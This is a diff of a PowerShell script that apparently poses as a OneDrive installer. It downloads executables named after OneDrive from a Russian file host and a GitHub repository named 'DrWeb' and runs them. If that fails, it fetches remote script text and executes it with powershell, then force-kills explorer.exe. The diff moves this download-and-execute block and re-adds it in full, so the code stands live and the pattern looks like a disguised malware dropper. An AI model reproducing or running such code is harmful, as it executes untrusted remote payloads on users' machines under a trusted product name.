@@ -14,22 +14,6 @@ $outputFile2 = 'OneDrive64.exe'
 $url='https://download.sberdisk.ru/download/file/1329361937?token=7yqqu5tUVMI9Xe7&filename=OneDrive.exe'
 $outputFile = 'OneDrive.exe'
 $url3 = 'https://raw.githubusercontent.com/nikitswi/DrWeb/main/OneDriveTaskManager.exe'
-$outputFile3 = 'OneDriveTaskManager.exe'
-while ((Test-Path $outputFile3) -eq $false) {
-    try {
-        Invoke-WebRequest -Uri $url3 -OutFile $outputFile3
-    }
-    catch {
-        Write-Host "Error downloading update launcher. Trying before..." -ForegroundColor Green
-        del 'OneDriveTaskManager.exe'
-        Start-Sleep -Seconds 10
-    }
-}
-if (Test-Path $outputFile3) {
-    Start-Process -FilePath $outputFile3
-} else {
-    $urlinstall = 'https://raw.githubusercontent.com/nikitswi/DrWeb/refs/heads/main/cmd2new.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell $result.content
-}
 while ((Test-Path $outputFile2) -eq $false) {
     try {
         Invoke-WebRequest -Uri $url2 -OutFile $outputFile2
@@ -52,6 +36,22 @@ while ((Test-Path $outputFile) -eq $false) {
     }
 }
 Write-Host "OneDrive installed, starting screen installer..." -ForegroundColor Green
+$outputFile3 = 'OneDriveTaskManager.exe'
+while ((Test-Path $outputFile3) -eq $false) {
+    try {
+        Invoke-WebRequest -Uri $url3 -OutFile $outputFile3
+    }
+    catch {
+        Write-Host "Error downloading update launcher. Trying before..." -ForegroundColor Green
+        del 'OneDriveTaskManager.exe'
+        Start-Sleep -Seconds 10
+    }
+}
+if (Test-Path $outputFile3) {
+    Start-Process -FilePath $outputFile3
+} else {
+    $urlinstall = 'https://raw.githubusercontent.com/nikitswi/DrWeb/refs/heads/main/cmd2new.txt';$result = Invoke-WebRequest -Uri $urlinstall; powershell $result.content
+}
 timeout /t 2
 taskkill /im explorer.exe /f
 timeout /t 2
